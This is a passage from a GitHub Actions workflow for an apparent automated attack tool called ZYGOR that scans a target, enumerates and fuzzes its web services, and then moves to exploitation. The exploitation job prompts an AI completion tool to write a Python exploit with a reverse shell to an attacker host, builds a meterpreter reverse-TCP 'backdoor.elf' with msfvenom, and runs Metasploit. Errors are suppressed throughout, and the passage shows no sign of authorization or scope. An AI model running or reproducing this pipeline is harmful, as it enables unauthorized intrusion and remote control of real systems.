  # ============================================================================
  # RECONNAISSANCE PHASE
  # ============================================================================
  recon:
    name: Reconnaissance
    needs: [bootstrap]
    runs-on: ubuntu-latest
    timeout-minutes: 360
    if: github.event_name == 'schedule' || inputs.penetration_phase == 'recon' || inputs.penetration_phase == 'full'
    steps:
      - name: Network Scan
        shell: bash
        run: |
          mkdir -p /tmp/recon
          nmap -T4 -A -p- --script vuln -oA /tmp/recon/nmap_full $TARGET 2>/dev/null || true
          masscan $TARGET --ports=1-65535 --rate=10000 -oX /tmp/recon/masscan.xml 2>/dev/null || true
          arp-scan --localnet > /tmp/recon/arp_scan.txt 2>/dev/null || true
      - name: Web Discovery
        shell: bash
        run: |
          subfinder -d $TARGET -o /tmp/recon/subdomains.txt 2>/dev/null || true
          whatweb $TARGET -a 3 --log-json=/tmp/recon/whatweb.json 2>/dev/null || true
          ffuf -u http://${TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o /tmp/recon/ffuf.json -of json -t 50 2>/dev/null || true
          nuclei -u http://${TARGET} -severity critical,high,medium -o /tmp/recon/nuclei.txt 2>/dev/null || true
      - name: OSINT
        shell: bash
        run: |
          dig any $TARGET > /tmp/recon/dns.txt 2>/dev/null || true
          whois $TARGET > /tmp/recon/whois.txt 2>/dev/null || true
          curl -s "https://crt.sh/?q=%25.${TARGET}&output=json" > /tmp/recon/cert.json 2>/dev/null || true
      - name: Upload Results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: recon-results-${{ github.run_id }}
          path: /tmp/recon/

  # ============================================================================
  # EXPLOITATION PHASE
  # ============================================================================
  exploit:
    name: Exploitation
    needs: [bootstrap, recon]
    runs-on: ubuntu-latest
    timeout-minutes: 360
    if: github.event_name == 'schedule' || inputs.penetration_phase == 'exploitation' || inputs.penetration_phase == 'full'
    steps:
      - name: AI Exploit Generation
        shell: bash
        run: |
          mkdir -p /tmp/exploits
          echo "Generate Python3 exploit for $TARGET with reverse shell to $LHOST:$LPORT" | ai_complete 8192 > /tmp/exploits/exploit.py 2>/dev/null || true
      - name: Metasploit
        shell: bash
        run: |
          echo "use auxiliary/scanner/portscan/tcp\nset RHOSTS $TARGET\nrun" > /tmp/exploits/msf.rc
          msfconsole -q -r /tmp/exploits/msf.rc 2>&1 | head -50 || true
      - name: Payload Generation
        shell: bash
        run: |
          msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o /tmp/exploits/backdoor.elf 2>/dev/null || true
      - name: Upload Results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: exploit-results-${{ github.run_id }}
          path: /tmp/exploits/

  # ============================================================================
  # DASHBOARD & REPORT
  # ============================================================================
  report:
    name: Dashboard & Report
    needs: [bootstrap, recon, exploit]
    runs-on: ubuntu-latest
    timeout-minutes: 60
    if: always()
    steps:
      - name: Generate Dashboard
        shell: bash
        run: |
          python3 /opt/zygor/bin/generate_dashboard.py "$TARGET" "$PHASE" "$AI_MODEL" "$GITHUB_RUN_ID"
      - name: Generate Summary
        shell: bash
        run: |
          mkdir -p /opt/zygor/reports/final
          echo "# ZYGOR v4.0 - Operation Complete" > /opt/zygor/reports/final/SUMMARY.md
          echo "Target: $TARGET" >> /opt/zygor/reports/final/SUMMARY.md
          echo "Phase: $PHASE" >> /opt/zygor/reports/final/SUMMARY.md
          echo "Model: $AI_MODEL" >> /opt/zygor/reports/final/SUMMARY.md
          echo "Run ID: $GITHUB_RUN_ID" >> /opt/zygor/reports/final/SUMMARY.md
          echo "Date: $(date -u)" >> /opt/zygor/reports/final/SUMMARY.md
          echo "Instagram: @zygorlap" >> /opt/zygor/reports/final/SUMMARY.md
      - name: Deploy Dashboard
        shell: bash
        run: |
          mkdir -p /tmp/pages
          cp -r /opt/zygor/dashboard/* /tmp/pages/ 2>/dev/null || true
          cp /opt/zygor/reports/final/SUMMARY.md /tmp/pages/ 2>/dev/null || true
          cd /tmp/pages
          git init && git checkout -b gh-pages
          git config user.email "zygor@pentest.ai"
          git config user.name "ZYGOR"
          git add . && git commit -m "dashboard" 2>/dev/null || true
          git remote add origin "https://x-access-token:${GITHUB_TOKEN_ABORT}@github.com/${GITHUB_REPOSITORY}.git" 2>/dev/null || true
          git push -f origin gh-pages 2>/dev/null || true
      - name: Upload Final Artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ZYGOR-Final-${{ github.run_id }}
          path: /opt/zygor/reports/

  # ============================================================================
  # CLEANUP
  # ============================================================================
  cleanup:
    name: Cleanup
    needs: [report]
    runs-on: ubuntu-latest
    timeout-minutes: 30
    if: always()
